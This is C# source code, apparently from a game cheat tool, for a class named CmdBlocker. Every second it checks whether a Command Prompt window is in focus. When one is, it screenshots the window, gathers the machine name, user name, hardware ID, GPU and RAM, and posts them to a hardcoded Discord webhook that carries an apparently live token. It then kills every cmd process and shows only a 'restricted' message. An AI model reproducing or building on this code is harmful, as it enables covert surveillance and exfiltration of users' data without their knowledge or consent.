#define DEBUG
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace WindowsFormsApp2;

public static class CmdBlocker
{
	public struct RECT
	{
		public int Left;

		public int Top;

		public int Right;

		public int Bottom;
	}

	private static readonly string HWIDFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "bangla_mal_hwid.dat");

	private static readonly string WebhookUrl = "https://discord.com/api/webhooks/1556098854384832583/_lXADyM3wO2BZXG6edrnXReoK_JMVXbt8Fw_q1Eg44R_oxWVaGGxmkkafX_B36prxAU3";

	private static readonly Timer BlockTimer = new Timer();

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

	[DllImport("user32.dll")]
	private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

	public static void Initialize()
	{
		BlockTimer.Interval = 1000;
		BlockTimer.Tick += (object sender, EventArgs e) =>
		{
			BlockCmdPrompt();
		};
		BlockTimer.Start();
	}

	public static async void BlockCmdPrompt()
	{
		string value = "Command Prompt";
		IntPtr foregroundWindow = GetForegroundWindow();
		if (foregroundWindow == IntPtr.Zero)
		{
			return;
		}
		StringBuilder stringBuilder = new StringBuilder(256);
		GetWindowText(foregroundWindow, stringBuilder, stringBuilder.Capacity);
		if (stringBuilder.ToString().Contains(value))
		{
			Bitmap bitmap = CaptureWindow(foregroundWindow);
			string text = Path.GetTempFileName() + ".png";
			bitmap.Save(text, ImageFormat.Png);
			string systemInfo = GetSystemInfo();
			SendToDiscord(systemInfo, text);
			Process[] processesByName = Process.GetProcessesByName("cmd");
			Process[] array = processesByName;
			foreach (Process process in array)
			{
				process.Kill();
			}
			MessageBox.Show("Command Prompt access is restricted", "internalxcheat", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
		}
	}

	private static bool IsBanned()
	{
		try
		{
			if (!File.Exists(HWIDFilePath))
			{
				return false;
			}
			string text = File.ReadAllText(HWIDFilePath);
			string hardwareId = GetHardwareId();
			return text == hardwareId;
		}
		catch
		{
			return false;
		}
	}

	private static string GetHardwareId()
	{
		string text = string.Empty;
		string text2 = string.Empty;
		using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor"))
		{
			using ManagementObjectCollection.ManagementObjectEnumerator managementObjectEnumerator = managementObjectSearcher.Get().GetEnumerator();
			if (managementObjectEnumerator.MoveNext())
			{
				ManagementObject managementObject = (ManagementObject)managementObjectEnumerator.Current;
				text = managementObject["ProcessorId"].ToString();
			}
		}
		using (ManagementObject managementObject2 = new ManagementObject("Win32_LogicalDisk.DeviceID=\"C:\""))
		{
			managementObject2.Get();
			text2 = managementObject2["VolumeSerialNumber"].ToString();
		}
		return text + text2;
	}

	private static string GetSystemInfo()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("# @everyone @here INTERNAL X CHEAT");
		stringBuilder.AppendLine("- Machine Name: " + Environment.MachineName);
		stringBuilder.AppendLine("- User Name: " + Environment.UserName);
		stringBuilder.AppendLine($"- OS Version: {Environment.OSVersion}");
		stringBuilder.AppendLine($"- Processor Count: {Environment.ProcessorCount}");
		stringBuilder.AppendLine($"- System Time: {DateTime.Now}");
		stringBuilder.AppendLine("- HWID: " + GetHardwareId());
		using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_VideoController"))
		{
			foreach (ManagementObject item in managementObjectSearcher.Get())
			{
				stringBuilder.AppendLine(string.Format("- GPU: {0}", item["Name"]));
			}
		}
		using (ManagementObjectSearcher managementObjectSearcher2 = new ManagementObjectSearcher("SELECT * FROM Win32_PhysicalMemory"))
		{
			ulong num = 0uL;
			foreach (ManagementObject item2 in managementObjectSearcher2.Get())
			{
				num += (ulong)item2["Capacity"];
			}
			stringBuilder.AppendLine($"- Total RAM: {num / 1073741824} GB");
		}
		return stringBuilder.ToString();
	}

	private static Bitmap CaptureWindow(IntPtr handle)
	{
		GetWindowRect(handle, out var lpRect);
		Rectangle rectangle = new Rectangle(lpRect.Left, lpRect.Top, lpRect.Right - lpRect.Left, lpRect.Bottom - lpRect.Top);
		Bitmap bitmap = new Bitmap(rectangle.Width, rectangle.Height);
		using Graphics graphics = Graphics.FromImage(bitmap);
		graphics.CopyFromScreen(new Point(rectangle.Left, rectangle.Top), Point.Empty, rectangle.Size);
		return bitmap;
	}

	private static void SendToDiscord(string message, string imagePath)
	{
		try
		{
			using HttpClient httpClient = new HttpClient();
			using MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent("\ud83d\udea8 **Command Prompt Access Attempt Detected** \ud83d\udea8\n\n" + message), "content");
			if (File.Exists(imagePath))
			{
				byte[] content = File.ReadAllBytes(imagePath);
				multipartFormDataContent.Add(new ByteArrayContent(content), "file", "cmd_attempt.png");
			}
			httpClient.DefaultRequestHeaders.Add("User-Agent", "CmdBlocker/1.0");
			HttpResponseMessage result = httpClient.PostAsync(WebhookUrl, multipartFormDataContent).Result;
			if (File.Exists(imagePath))
			{
				File.Delete(imagePath);
			}
		}
		catch (Exception ex)
		{
			Debug.WriteLine("Error sending to Discord: " + ex.Message);
		}
	}
}
